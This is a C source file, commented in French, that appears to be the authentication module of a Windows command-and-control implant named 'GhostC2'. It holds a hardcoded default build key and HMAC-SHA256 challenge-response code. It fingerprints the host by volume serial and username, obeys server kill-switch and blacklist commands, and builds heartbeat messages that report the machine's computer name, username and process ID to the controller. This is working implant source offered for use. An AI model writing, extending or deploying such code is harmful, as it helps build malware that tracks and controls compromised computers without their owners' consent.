/*
 * auth.c - Authentification de l'agent
 *
 * Implémente le système Challenge-Response HMAC-SHA256
 * pour prouver que l'agent possède la bonne Build Key.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "advapi32.lib")

/* Config */

// Clé de build par défaut (sera remplacée par le builder)
// Format: 32 bytes (256 bits) pour HMAC-SHA256
static BYTE g_buildKey[32] = {
    0x47, 0x68, 0x6f, 0x73, 0x74, 0x43, 0x32, 0x2d,  // "GhostC2-"
    0x44, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x42,  // "DefaultB"
    0x75, 0x69, 0x6c, 0x64, 0x4b, 0x65, 0x79, 0x2d,  // "uildKey-"
    0x32, 0x30, 0x32, 0x36, 0x00, 0x00, 0x00, 0x00   // "2026" + padding
};

static BOOL g_isAuthenticated = FALSE;
static BOOL g_isKilled = FALSE;           // Kill switch activé
static char g_authToken[65] = {0};        // Token de session après auth
static char g_agentID[32] = {0};          // ID unique de l'agent
static DWORD g_lastHeartbeat = 0;         // Dernier heartbeat

/* Crypto helpers */

/* Convertit des bytes en hex string */
static void BytesToHex(const BYTE* bytes, DWORD len, char* outHex) {
    for (DWORD i = 0; i < len; i++) {
        sprintf(outHex + (i * 2), "%02x", bytes[i]);
    }
    outHex[len * 2] = '\0';
}

/* Convertit une hex string en bytes */
static BOOL HexToBytes(const char* hex, BYTE* outBytes, DWORD* outLen) {
    size_t hexLen = strlen(hex);
    if (hexLen % 2 != 0) return FALSE;
    
    *outLen = (DWORD)(hexLen / 2);
    for (size_t i = 0; i < *outLen; i++) {
        int val;
        if (sscanf(hex + (i * 2), "%2x", &val) != 1) return FALSE;
        outBytes[i] = (BYTE)val;
    }
    return TRUE;
}

/* Calcule HMAC-SHA256 */
static BOOL ComputeHMAC_SHA256(const BYTE* key, DWORD keyLen,
                                const BYTE* data, DWORD dataLen,
                                BYTE* outMAC, DWORD* outMACLen) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTHASH hHmac = 0;
    HCRYPTKEY hKey = 0;
    BOOL result = FALSE;

    // Structure pour importer la clé HMAC
    typedef struct {
        BLOBHEADER hdr;
        DWORD keyLen;
        BYTE key[32];
    } HMAC_KEY_BLOB;

    HMAC_KEY_BLOB keyBlob;
    keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
    keyBlob.hdr.reserved = 0;
    keyBlob.hdr.aiKeyAlg = CALG_RC2; // Placeholder, sera utilisé pour HMAC
    keyBlob.keyLen = keyLen > 32 ? 32 : keyLen;
    memcpy(keyBlob.key, key, keyBlob.keyLen);

    // Acquiert le context crypto
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        goto cleanup;
    }

    // Importe la clé
    if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(BLOBHEADER) + sizeof(DWORD) + keyBlob.keyLen, 0, CRYPT_IPSEC_HMAC_KEY, &hKey)) {
        goto cleanup;
    }

    // Crée le hash HMAC
    if (!CryptCreateHash(hProv, CALG_HMAC, hKey, 0, &hHmac)) {
        goto cleanup;
    }

    // Configure pour SHA-256
    HMAC_INFO hmacInfo;
    memset(&hmacInfo, 0, sizeof(hmacInfo));
    hmacInfo.HashAlgid = CALG_SHA_256;
    
    if (!CryptSetHashParam(hHmac, HP_HMAC_INFO, (BYTE*)&hmacInfo, 0)) {
        goto cleanup;
    }

    // Hash les données
    if (!CryptHashData(hHmac, data, dataLen, 0)) {
        goto cleanup;
    }

    // Récupère le résultat
    *outMACLen = 32; // SHA-256 = 32 bytes
    if (!CryptGetHashParam(hHmac, HP_HASHVAL, outMAC, outMACLen, 0)) {
        goto cleanup;
    }

    result = TRUE;

cleanup:
    if (hHmac) CryptDestroyHash(hHmac);
    if (hKey) CryptDestroyKey(hKey);
    if (hProv) CryptReleaseContext(hProv, 0);
    
    return result;
}

/* Public API */

/*
 * Répond à un challenge d'authentification.
 * Calcule HMAC-SHA256(buildKey, challenge) et retourne le résultat en hex.
 */
BOOL Auth_RespondToChallenge(const char* challengeHex, char* responseHex, DWORD responseHexSize) {
    if (!challengeHex || !responseHex || responseHexSize < 65) return FALSE;

    // Décode le challenge
    BYTE challenge[64];
    DWORD challengeLen = 0;
    if (!HexToBytes(challengeHex, challenge, &challengeLen)) {
        return FALSE;
    }

    // Calcule HMAC-SHA256
    BYTE mac[32];
    DWORD macLen = 32;
    if (!ComputeHMAC_SHA256(g_buildKey, sizeof(g_buildKey), challenge, challengeLen, mac, &macLen)) {
        return FALSE;
    }

    // Convertit en hex
    BytesToHex(mac, macLen, responseHex);
    
    return TRUE;
}

/*
 * Stocke le token d'authentification reçu du serveur.
 */
void Auth_SetToken(const char* token) {
    if (token && strlen(token) < sizeof(g_authToken)) {
        strncpy(g_authToken, token, sizeof(g_authToken) - 1);
        g_authToken[sizeof(g_authToken) - 1] = '\0';
        g_isAuthenticated = TRUE;
    }
}

/*
 * Retourne le token d'authentification actuel.
 */
const char* Auth_GetToken(void) {
    return g_authToken;
}

/*
 * Vérifie si l'agent est authentifié.
 */
BOOL Auth_IsAuthenticated(void) {
    return g_isAuthenticated;
}

/*
 * Réinitialise l'état d'authentification.
 */
void Auth_Reset(void) {
    g_isAuthenticated = FALSE;
    memset(g_authToken, 0, sizeof(g_authToken));
}

/*
 * Génère un Agent ID unique basé sur le matériel.
 * Format: GHOST-XXXXXXXX (basé sur Volume Serial + Username hash)
 */
BOOL Auth_GenerateAgentID(char* agentID, DWORD agentIDSize) {
    if (!agentID || agentIDSize < 16) return FALSE;

    // Récupère le serial du volume C:
    DWORD volumeSerial = 0;
    GetVolumeInformationA("C:\\", NULL, 0, &volumeSerial, NULL, NULL, NULL, 0);

    // Récupère le nom d'utilisateur
    char username[256] = {0};
    DWORD usernameLen = sizeof(username);
    GetUserNameA(username, &usernameLen);

    // Hash simple du username
    DWORD usernameHash = 0;
    for (char* p = username; *p; p++) {
        usernameHash = usernameHash * 31 + *p;
    }

    // Combine les deux
    DWORD combinedID = volumeSerial ^ usernameHash;

    // Formate l'ID
    snprintf(agentID, agentIDSize, "GHOST-%08X", combinedID);

    // Stocke l'ID localement
    strncpy(g_agentID, agentID, sizeof(g_agentID) - 1);

    return TRUE;
}

/*
 * Retourne l'ID de l'agent
 */
const char* Auth_GetAgentID(void) {
    if (g_agentID[0] == '\0') {
        Auth_GenerateAgentID(g_agentID, sizeof(g_agentID));
    }
    return g_agentID;
}

/* Kill Switch */

/*
 * Active le kill switch - l'agent s'arrêtera proprement
 */
void Auth_ActivateKillSwitch(void) {
    g_isKilled = TRUE;
    g_isAuthenticated = FALSE;
    memset(g_authToken, 0, sizeof(g_authToken));
}

/*
 * Vérifie si le kill switch est activé
 */
BOOL Auth_IsKilled(void) {
    return g_isKilled;
}

/*
 * Vérifie le kill switch auprès du serveur
 * Retourne TRUE si l'agent doit continuer, FALSE s'il doit s'arrêter
 */
BOOL Auth_CheckKillSwitch(const char* serverResponse) {
    if (!serverResponse) return TRUE;
    
    // Cherche "kill":true dans la réponse JSON
    if (strstr(serverResponse, "\"kill\":true") != NULL ||
        strstr(serverResponse, "\"kill\": true") != NULL) {
        Auth_ActivateKillSwitch();
        return FALSE;
    }
    
    // Cherche si notre ID est dans une blacklist
    const char* agentID = Auth_GetAgentID();
    if (strstr(serverResponse, agentID) != NULL &&
        strstr(serverResponse, "\"blacklist\"") != NULL) {
        Auth_ActivateKillSwitch();
        return FALSE;
    }
    
    return TRUE;
}

/* Heartbeat */

/*
 * Met à jour le timestamp du dernier heartbeat
 */
void Auth_UpdateHeartbeat(void) {
    g_lastHeartbeat = GetTickCount();
}

/*
 * Retourne le temps écoulé depuis le dernier heartbeat (en ms)
 */
DWORD Auth_GetTimeSinceHeartbeat(void) {
    if (g_lastHeartbeat == 0) return 0;
    return GetTickCount() - g_lastHeartbeat;
}

/*
 * Vérifie si le heartbeat est en timeout
 * timeout: temps max en ms avant de considérer le serveur down
 */
BOOL Auth_IsHeartbeatTimeout(DWORD timeoutMs) {
    if (g_lastHeartbeat == 0) return FALSE;
    return (GetTickCount() - g_lastHeartbeat) > timeoutMs;
}

/*
 * Génère les données de heartbeat en JSON
 */
BOOL Auth_GenerateHeartbeat(char* outJson, DWORD outJsonSize) {
    if (!outJson || outJsonSize < 256) return FALSE;
    
    const char* agentID = Auth_GetAgentID();
    
    // Récupère quelques infos système
    DWORD pid = GetCurrentProcessId();
    
    char computerName[256] = {0};
    DWORD compNameSize = sizeof(computerName);
    GetComputerNameA(computerName, &compNameSize);
    
    char userName[256] = {0};
    DWORD userNameSize = sizeof(userName);
    GetUserNameA(userName, &userNameSize);
    
    snprintf(outJson, outJsonSize,
        "{\n"
        "  \"type\": \"heartbeat\",\n"
        "  \"agent_id\": \"%s\",\n"
        "  \"pid\": %lu,\n"
        "  \"computer\": \"%s\",\n"
        "  \"user\": \"%s\",\n"
        "  \"authenticated\": %s,\n"
        "  \"uptime_ms\": %lu\n"
        "}",
        agentID,
        pid,
        computerName,
        userName,
        g_isAuthenticated ? "true" : "false",
        GetTickCount());
    
    return TRUE;
}

/*
 * Valide une réponse du serveur et met à jour l'état
 */
BOOL Auth_ValidateServerResponse(const char* response) {
    if (!response) return FALSE;
    
    // Vérifie le kill switch d'abord
    if (!Auth_CheckKillSwitch(response)) {
        return FALSE;
    }
    
    // Met à jour le heartbeat
    Auth_UpdateHeartbeat();
    
    // Cherche un nouveau token si présent
    const char* tokenStart = strstr(response, "\"token\":\"");
    if (tokenStart) {
        tokenStart += 9; // Skip "token":"
        const char* tokenEnd = strchr(tokenStart, '"');
        if (tokenEnd && (tokenEnd - tokenStart) < 64) {
            size_t tokenLen = tokenEnd - tokenStart;
            memset(g_authToken, 0, sizeof(g_authToken));
            memcpy(g_authToken, tokenStart, tokenLen);
            g_isAuthenticated = TRUE;
        }
    }
    
    return TRUE;
}
